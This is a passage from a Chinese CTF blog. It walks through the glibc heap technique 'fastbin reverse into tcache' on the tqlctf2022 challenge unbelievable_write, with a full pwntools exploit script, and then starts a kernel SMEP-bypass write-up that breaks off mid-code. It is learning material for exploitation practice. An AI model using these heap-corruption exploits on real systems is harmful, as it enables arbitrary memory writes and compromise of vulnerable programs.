title="简化流程"></a>简化流程</h2><ol><li>填满tcache，第八个块记作victim。</li><li>再根据要求释放6个块或者1个(是否有垃圾数据，一般就6个块)到fastbin</li><li>从tcache中取出所有bins</li><li>将victim的bk改为想要分配的地址（应该是位于fastbin的末尾）</li><li>（检查此时：tcache为空，fastbin有7个正常堆块，最后一个为目标堆块）</li><li>malloc一个fastbin的，此时tcache将被填满，第一个堆块是目标堆块</li></ol><h1 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h1><p>这里例子就采用tqlctf2022的一道unbelievable_write来练习。<a href="https://github.com/Nicholas-wei/pwn/tree/main/tqlctf/ub_write">下载以及exp</a></p><p>这个题目的libc2.31的，因为dockerfile里面写的是20.04.</p><p>查看保护发现没有开启PIE，并且要求我们往target写入任意一个数值改掉原来的就算成功</p><p><img src="/2022/02/23/fastbin-reverse-into-tcache/image-20220223102610057.png" alt="image-20220223102610057"></p><p><img src="/2022/02/23/fastbin-reverse-into-tcache/image-20220223102505734.png" alt="image-20220223102505734"></p><p>看一下给定的操作有什么。</p><p>c1函数允许我们分配一个任意大小的堆块，然后就会立即释放。这里立即释放有些困难，因为释放就会导致数据被清除，并且无法控制bins。当时就是在这里卡住不会了。</p><p><img src="/2022/02/23/fastbin-reverse-into-tcache/image-20220223102700648.png" alt="image-20220223102700648"></p><p>c2允许我们任意释放一个地址。注意v1可以为负，也就是说我们可以free掉tcache管理块。</p><p><img src="/2022/02/23/fastbin-reverse-into-tcache/image-20220223102838274.png" alt="image-20220223102838274"></p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>由于没有限制任意free的chunk位置，可以free掉tcache管理块，构造管理块数据，先伪造tcache已满，再伪造fastbin，再使用上述攻击方法。<strong>不能直接往tcache里面写这个堆块的地址。因为malloc之后就要进行free，会检查堆块size位置，这里因为没有size会直接结束。</strong>因此要用能够写入一个大数的方法。这里采用的是fastbin reverse into tcache。</p><p>这里比较关键的一步是获取tcache管理块的写权限。也就是给定的c3函数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">delete(-<span class="number">0x290</span>) <span class="comment"># 释放tcache管理块</span></span><br></pre></td></tr></table></figure><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>这里一个特别关键的地方：<strong>fastbin的大小范围是0x20到0x90，我们在把堆块放入fastbin的时候，需要tcache size位置满，这一点可以用tcache管理块在bins中后面加上一块chunk来做到(也就是写了tcache管理块的fd位置，这里也正是fastbin chunk个数所在的位置)。</strong>如下图就是通过0x290chunk的fd控制了0x20位置的个数。</p><p><img src="/2022/02/23/fastbin-reverse-into-tcache/image-20220223160940584.png" alt="image-20220223160940584"></p><p>接下来通过malloc管理chunk，修改对应bins中最低地址(其中最低地址预先写为0x21)来伪造拿到0x21的块，接着释放就到了fastbin中。</p><p>但是还有一点：我们在reversing攻击的时候，要求tcache的0x20位置个数为0，不然无法放入Bins。又需要把0x290后面的chunk拿出来。但是程序刚malloc完就free，看似无法做到？</p><p>实际上可以在malloc出来0x290的块的时候，直接写入0x290位置为0(拿出来管理chunk之后，上图中0x155e2c0就会被放到管理块0x290位置上，此时设置为空，再free的时候，0x290的后面就只剩下自己一个了)</p><p><img src="/2022/02/23/fastbin-reverse-into-tcache/image-20220223161511495.png" alt="image-20220223161511495"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fake_t = p16(<span class="number">0</span>)*<span class="number">8</span>*<span class="number">4</span>+p16(<span class="number">0</span>)*<span class="number">8</span>*<span class="number">4</span>+p64(<span class="number">0</span>)*<span class="number">40</span> <span class="comment"># reset tcache to null</span></span><br></pre></td></tr></table></figure><p>这里顺便记录一下tcache结构。下图和pwndbg中看到的结构一样。顺序看起来很奇怪是因为地址的原因。不熟悉的话可以自己调试一下。(保存在tcache结构.xlsx中)</p><p><img src="/2022/02/23/fastbin-reverse-into-tcache/image-20220223163420527.png" alt="tcache结构2.31"></p><p>还有一点需要注意：为了修改victim的bk，我们需要一个越界写，这个可以通过将第一个free的chunk的size改大而不是0x21就可以做到。如下，低字节释放0x401对应的chunk，就可以再拿回来写后面chunk的bk位置。 </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pay_large = p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x401</span>)+(p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>))*<span class="number">0x7</span></span><br></pre></td></tr></table></figure><p>这题知道这些差不多就能做了。但是还有一个比较坑的地方，就是这里puts是没有初始化buffer的。导致后面输出flag的时候报malloc的错（也是很无语）要在之前输出一次no，初始化了buffer即可。</p><p><img src="/2022/02/23/fastbin-reverse-into-tcache/image-20220223164314209.png" alt="填充fastbin"></p><p>如下为完成了攻击</p><p><img src="/2022/02/23/fastbin-reverse-into-tcache/image-20220223164543124.png" alt="fastbin_reversing_into_tcache"></p><p>以下为改掉之后的target</p><p><img src="/2022/02/23/fastbin-reverse-into-tcache/image-20220223164627102.png" alt="修改过后的target"></p><p><img src="/2022/02/23/fastbin-reverse-into-tcache/image-20220223164743741.png" alt="image-20220223164743741"></p><h2 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h2><p>注释比较多，懒得删掉了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">filename=<span class="string">&quot;./pwn&quot;</span></span><br><span class="line">io = process(filename)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf=ELF(filename)</span><br><span class="line">libc=elf.libc</span><br><span class="line">context.terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;split&#x27;</span>,<span class="string">&#x27;-hp&#x27;</span>,<span class="string">&#x27;60&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">sz,con</span>):</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(sz))</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    io.sendline(con)</span><br><span class="line">    <span class="comment"># sa(&quot;content?&quot;,cno)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getflag</span>():</span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io,<span class="string">&quot;b *0x40153E&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># alloc a large chunk prepare to overwrite bk</span></span><br><span class="line">payload1 = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x400</span>)</span><br><span class="line">add(<span class="number">0x288</span>,payload1) <span class="comment"># onlu used to set bk not null</span></span><br><span class="line"><span class="comment"># gdb.attach(io,&quot;b *0x4013FD&quot;)</span></span><br><span class="line"> <span class="comment"># free control chunk</span></span><br><span class="line"><span class="comment"># sleep(0.1)</span></span><br><span class="line"><span class="comment">#          gdb.attach(io,&quot;b *0x4013BF&quot;) # break at 2</span></span><br><span class="line"><span class="comment"># each free, put a 0x20 chunk into bins. so we need chunks with 0x21 first</span></span><br><span class="line">pay_large = p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x401</span>)+(p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>))*<span class="number">0x7</span></span><br><span class="line">pay = p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">add(<span class="number">0x98</span>,pay_large) <span class="comment"># into tcache</span></span><br><span class="line">add(<span class="number">0xa8</span>,pay*<span class="number">10</span>)</span><br><span class="line">add(<span class="number">0xb8</span>,pay*<span class="number">11</span>)</span><br><span class="line">add(<span class="number">0xc8</span>,pay*<span class="number">12</span>)</span><br><span class="line">add(<span class="number">0xd8</span>,pay*<span class="number">13</span>)</span><br><span class="line">add(<span class="number">0xe8</span>,pay*<span class="number">14</span>)</span><br><span class="line">add(<span class="number">0xf8</span>,pay*<span class="number">15</span>)</span><br><span class="line">add(<span class="number">0x108</span>,pay*<span class="number">16</span>)</span><br><span class="line">add(<span class="number">0x118</span>,pay*<span class="number">17</span>)</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">delete(-<span class="number">0x290</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io,&quot;b *0x4013BF&quot;) # break at 2</span></span><br><span class="line">choice(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x288</span>,p64(<span class="number">0</span>)*<span class="number">2</span>+p16(<span class="number">0x8</span>)*<span class="number">4</span>*<span class="number">3</span>) <span class="comment"># set all 7, then freed</span></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">add(<span class="number">0x288</span>,p64(<span class="number">0</span>)*<span class="number">2</span>+p16(<span class="number">0x8</span>)*<span class="number">4</span>*<span class="number">3</span>+p16(<span class="number">0x1</span>)*<span class="number">4</span>*<span class="number">8</span>+p64(<span class="number">0</span>)*<span class="number">0xb</span>+p8(<span class="number">0x70</span>)) <span class="comment"># change first block</span></span><br><span class="line"><span class="comment"># gdb.attach(io,&quot;b *0x401387&quot;) # b malloc</span></span><br><span class="line">add(<span class="number">0x98</span>,<span class="string">&#x27;a&#x27;</span>) <span class="comment"># freed 0x400 chunk, to overwrite bk</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># badluck chunk</span></span><br><span class="line"><span class="comment"># add(0x288,p16(0x7)*4*2+p16(0x8)*4*3+p16(0x1)*4*5+p64(0)*0xf+p8(0xe0))</span></span><br><span class="line"><span class="comment"># # gdb.attach(io,&quot;b *0x4013A8&quot;) #b free</span></span><br><span class="line"><span class="comment"># add(0xa8,&#x27;a&#x27;) # freed 0x20 into fastbin </span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x288</span>,p16(<span class="number">0x7</span>)*<span class="number">4</span>*<span class="number">2</span>+p16(<span class="number">0x8</span>)*<span class="number">4</span>*<span class="number">3</span>+p16(<span class="number">0x1</span>)*<span class="number">4</span>*<span class="number">0xb</span>+p64(<span class="number">0</span>)*<span class="number">0xa</span>+p8(<span class="number">0xc0</span>))</span><br><span class="line"><span class="comment"># gdb.attach(io,&quot;b *0x4013A8&quot;) #b free</span></span><br><span class="line"><span class="comment"># gdb.attach(io,&quot;b *0x401387&quot;)</span></span><br><span class="line">add(<span class="number">0xb8</span>,<span class="string">&#x27;a&#x27;</span>) <span class="comment"># fastbin 1,victim</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x288</span>,p16(<span class="number">0x7</span>)*<span class="number">4</span>*<span class="number">2</span>+p16(<span class="number">0x8</span>)*<span class="number">4</span>*<span class="number">3</span>+p16(<span class="number">0x1</span>)*<span class="number">4</span>*<span class="number">0xb</span>+p64(<span class="number">0</span>)*<span class="number">0xb</span>+p8(<span class="number">0x80</span>))</span><br><span class="line"><span class="comment"># gdb.attach(io,&quot;b *0x4013A8&quot;) #b free</span></span><br><span class="line"><span class="comment"># gdb.attach(io,&quot;b *0x401387&quot;)</span></span><br><span class="line">add(<span class="number">0xc8</span>,<span class="string">&#x27;a&#x27;</span>) <span class="comment"># fast2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x288</span>,p16(<span class="number">0x7</span>)*<span class="number">4</span>*<span class="number">2</span>+p16(<span class="number">0x8</span>)*<span class="number">4</span>*<span class="number">3</span>+p16(<span class="number">0x1</span>)*<span class="number">4</span>*<span class="number">0xb</span>+p64(<span class="number">0</span>)*<span class="number">0xc</span>+p8(<span class="number">0x50</span>))</span><br><span class="line"><span class="comment"># gdb.attach(io,&quot;b *0x4013A8&quot;) #b free</span></span><br><span class="line"><span class="comment"># gdb.attach(io,&quot;b *0x401387&quot;)</span></span><br><span class="line">add(<span class="number">0xd8</span>,<span class="string">&#x27;a&#x27;</span>) <span class="comment"># fast3</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x288</span>,p16(<span class="number">0x7</span>)*<span class="number">4</span>*<span class="number">2</span>+p16(<span class="number">0x8</span>)*<span class="number">4</span>*<span class="number">3</span>+p16(<span class="number">0x1</span>)*<span class="number">4</span>*<span class="number">0xb</span>+p64(<span class="number">0</span>)*<span class="number">0xd</span>+p8(<span class="number">0x30</span>))</span><br><span class="line"><span class="comment"># gdb.attach(io,&quot;b *0x4013A8&quot;) #b free</span></span><br><span class="line"><span class="comment"># gdb.attach(io,&quot;b *0x401387&quot;)</span></span><br><span class="line">add(<span class="number">0xe8</span>,<span class="string">&#x27;a&#x27;</span>) <span class="comment"># fast4</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x288</span>,p16(<span class="number">0x7</span>)*<span class="number">4</span>*<span class="number">2</span>+p16(<span class="number">0x8</span>)*<span class="number">4</span>*<span class="number">3</span>+p16(<span class="number">0x1</span>)*<span class="number">4</span>*<span class="number">0xb</span>+p64(<span class="number">0</span>)*<span class="number">0xe</span>+p8(<span class="number">0x20</span>))</span><br><span class="line"><span class="comment"># gdb.attach(io,&quot;b *0x4013A8&quot;) #b free</span></span><br><span class="line"><span class="comment"># gdb.attach(io,&quot;b *0x401387&quot;)</span></span><br><span class="line">add(<span class="number">0xf8</span>,<span class="string">&#x27;a&#x27;</span>) <span class="comment">#fast5</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x288</span>,p16(<span class="number">0x7</span>)*<span class="number">4</span>*<span class="number">2</span>+p16(<span class="number">0x8</span>)*<span class="number">4</span>*<span class="number">3</span>+p16(<span class="number">0x1</span>)*<span class="number">4</span>*<span class="number">0xb</span>+p64(<span class="number">0</span>)*<span class="number">0xf</span>+p8(<span class="number">0x20</span>))</span><br><span class="line"><span class="comment"># gdb.attach(io,&quot;b *0x4013A8&quot;) #b free</span></span><br><span class="line"><span class="comment"># gdb.attach(io,&quot;b *0x401387&quot;)</span></span><br><span class="line">add(<span class="number">0x108</span>,<span class="string">&#x27;a&#x27;</span>) <span class="comment">#fast6</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x288</span>,p16(<span class="number">0x7</span>)*<span class="number">4</span>*<span class="number">2</span>+p16(<span class="number">0x8</span>)*<span class="number">4</span>*<span class="number">3</span>+p16(<span class="number">0x1</span>)*<span class="number">4</span>*<span class="number">0xb</span>+p64(<span class="number">0</span>)*<span class="number">0x10</span>+p8(<span class="number">0x30</span>))</span><br><span class="line"><span class="comment"># gdb.attach(io,&quot;b *0x4013A8&quot;) #b free</span></span><br><span class="line"><span class="comment"># gdb.attach(io,&quot;b *0x401387&quot;)</span></span><br><span class="line">add(<span class="number">0x118</span>,<span class="string">&#x27;a&#x27;</span>) <span class="comment">#fast7</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># malloc one 0x400 and overwrite victim&#x27;s bk</span></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x148</span>+p64(<span class="number">0x21</span>)+p64(<span class="number">0x404070</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io,&quot;b *0x4013A8&quot;) #b free</span></span><br><span class="line">add(<span class="number">0x3f8</span>,payload) <span class="comment"># check last chunk</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># release the padding chunk, changing the 0x400 chunk</span></span><br><span class="line"><span class="comment"># gdb.attach(io,&quot;b *0x401387&quot;)</span></span><br><span class="line">fake_t = p16(<span class="number">7</span>)*<span class="number">8</span>*<span class="number">4</span>+p16(<span class="number">1</span>)*<span class="number">8</span>*<span class="number">4</span>+p64(<span class="number">0</span>)*<span class="number">40</span> <span class="comment"># reset tcache</span></span><br><span class="line"><span class="comment"># debug() # show in blog</span></span><br><span class="line">add(<span class="number">0x280</span>,fake_t)  <span class="comment"># reput after changed the padding one, so 0x20 is empty now</span></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">&#x27;a&#x27;</span>) <span class="comment"># fastbin reverse into tcache</span></span><br><span class="line"></span><br><span class="line">fake_t = p16(<span class="number">0</span>)*<span class="number">8</span>*<span class="number">4</span>+p16(<span class="number">0</span>)*<span class="number">8</span>*<span class="number">4</span>+p64(<span class="number">0</span>)*<span class="number">40</span> <span class="comment"># reset tcache to null</span></span><br><span class="line"><span class="comment"># debug() # show in blog</span></span><br><span class="line">add(<span class="number">0x280</span>,fake_t)  <span class="comment"># reput after changed the padding one, so 0x20 is empty now</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io,&quot;b *0x4013BF&quot;)</span></span><br><span class="line">choice(<span class="number">2</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io,&quot;b *0x401387&quot;) # b malloc</span></span><br><span class="line"><span class="comment"># add(0x18,&#x27;a&#x27;) # write into target</span></span><br><span class="line"><span class="comment"># gdb.attach(io,&quot;b *0x401444&quot;)</span></span><br><span class="line">getflag()</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> basic </category>
          
      </categories>
      
      
        <tags>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kernel-5-bypass_smep1</title>
      <link href="/2022/02/15/kernel-5-bypass-smep1/"/>
      <url>/2022/02/15/kernel-5-bypass-smep1/</url>
      
        <content type="html"><![CDATA[<p>第五次学习kernel，寒假也接近了尾声。回想一下寒假学了什么，主要是复习了一下堆中不熟悉的IO_FILE攻击、建立了这个博客，pwnable.tw上刷了4道题，学习了kernel，出了一道题，打了一次dicectf。还是感觉时间好快。</p><span id="more"></span><h1 id="检查保护"><a href="#检查保护" class="headerlink" title="检查保护"></a>检查保护</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">-m 256M \</span><br><span class="line">-kernel ./bzImage \</span><br><span class="line">-initrd  ./built.cpio \</span><br><span class="line">-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet&quot; \</span><br><span class="line">-cpu qemu64,+smep,+smap \</span><br><span class="line">-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \</span><br><span class="line">-s \</span><br><span class="line">-nographic</span><br></pre></td></tr></table></figure><p>开启了smep保护。内核不可执行用户空间代码。</p><h1 id="分析代码"><a href="#分析代码" class="headerlink" title="分析代码"></a>分析代码</h1><p>这道内核题目给了源码，一看有400行。我们先使用头来逆向。（想起来被mit6.828支配的恐惧）</p><p>回想一下JOS中的IPC通信，主要是两个进程各有一个监听者和一个发送者，不断循环等待接收数据。大致思路有了，我们从<code>file_operation</code>开始入手。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">csaw_fops</span> =</span> &#123;</span><br><span class="line">    owner:          THIS_MODULE,</span><br><span class="line">    open:           csaw_open,</span><br><span class="line">    release:        csaw_release,</span><br><span class="line">    unlocked_ioctl: csaw_ioctl,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="open函数"><a href="#open函数" class="headerlink" title="open函数"></a>open函数</h2><p>可以看到一共有三种操作方式，open,release和ioctl。最后一种应该是为了提供更多操作而单独列出来的。首先看<code>open</code>函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">csaw_open</span> <span class="params">( <span class="keyword">struct</span> inode *inode, <span class="keyword">struct</span> file *file )</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ipc_state</span> *<span class="title">state</span>;</span></span><br><span class="line">    state = kzalloc(<span class="keyword">sizeof</span>(*state), GFP_KERNEL);</span><br><span class="line">    <span class="keyword">if</span> ( state == <span class="literal">NULL</span> )</span><br><span class="line">        <span class="keyword">return</span> -ENOMEM;</span><br><span class="line">    mutex_init(&amp;state-&gt;lock);</span><br><span class="line">    file-&gt;private_data = state;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个操作是将<code>file</code>类型文件的<code>private_data</code>改成<code>state</code>。而<code>state</code>是我们通过kazlloc申请出来的一段内存。file结构体是什么，交叉引用得不到。可能是源码中，同级目录下没有导致的。我们暂且不管，认为他就是普通的文件。</p><h2 id="release函数"><a href="#release函数" class="headerlink" title="release函数"></a>release函数</h2><p>接下来看<code>release</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">csaw_release</span> <span class="params">( <span class="keyword">struct</span> inode *inode, <span class="keyword">struct</span> file *file )</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ipc_state</span> *<span class="title">state</span> =</span> file-&gt;private_data;</span><br><span class="line">    <span class="keyword">if</span> ( state-&gt;channel )</span><br><span class="line">        ipc_channel_put(state, state-&gt;channel);</span><br><span class="line">    kfree(state);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里调用了<code>ipc_channel_put</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">ipc_channel_put</span> <span class="params">( <span class="keyword">struct</span> ipc_state *state, <span class="keyword">struct</span> ipc_channel *channel )</span></span><br><span class="line">&#123;</span><br><span class="line">    kref_put(&amp;channel-&gt;ref, ipc_channel_destroy);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ipc_channel_destroy如下</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">ipc_channel_destroy</span> <span class="params">( <span class="keyword">struct</span> kref *ref )</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ipc_channel</span> *<span class="title">channel</span> =</span> container_of(ref, <span class="keyword">struct</span> ipc_channel, ref);</span><br><span class="line"></span><br><span class="line">    idr_remove(&amp;ipc_idr, channel-&gt;id);</span><br><span class="line"></span><br><span class="line">    kfree(channel-&gt;data);</span><br><span class="line">    kfree(channel);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看起来像是释放空间，这里没有洞。</p><h2 id="ioctl"><a href="#ioctl" class="headerlink" title="ioctl"></a>ioctl</h2><p>接下来是<code>ioctl</code>函数。函数较长就不列出了。主要写一下我对这几个操作函数的理解。channel相当于一种类似管道的数据缓冲区。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// CSAW_ALLOC_CHANNEL</span></span><br><span class="line">主要是调用alloc_new_ipc_channel分配一个channel以及channelID.同时如果此时copy_to_user成功了就说明出错(不清楚这里的作用，是为了验证没有数据残留吗？)</span><br><span class="line"><span class="comment">// CSAW_OPEN_CHANNEL</span></span><br><span class="line">最主要是将state-&gt;channel设置为当前根据id选择的channel</span><br><span class="line"><span class="comment">// CSAW_GROW_CHANNEL\CSAW_SHRINK_CHANNEL</span></span><br><span class="line">调用内核<span class="built_in">realloc</span>调整channel大小</span><br><span class="line"><span class="comment">// CSAW_READ_CHANNEL\CSAW_WRITE_CHANNEL</span></span><br><span class="line">将用户数据读入challel或者将channel数据写回给用户</span><br><span class="line"><span class="comment">// CSAW_SEEK_CHANNEL</span></span><br><span class="line">给出当前操作的channel特定位置的指针&lt;类似fseek,包含前向偏移和后向偏移&gt;</span><br></pre></td></tr></table></figure><h1 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h1><p>这里需要对内核malloc机制有所了解才能做出来。漏洞在<code>realloc</code>函数中。如下图</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">realloc_ipc_channel</span> <span class="params">( <span class="keyword">struct</span> ipc_state *state, <span class="type">int</span> id, <span class="type">size_t</span> size, <span class="type">int</span> grow )</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ipc_channel</span> *<span class="title">channel</span>;</span></span><br><span class="line">    <span class="type">size_t</span> new_size;</span><br><span class="line">    <span class="type">char</span> *new_data;</span><br><span class="line">    channel = 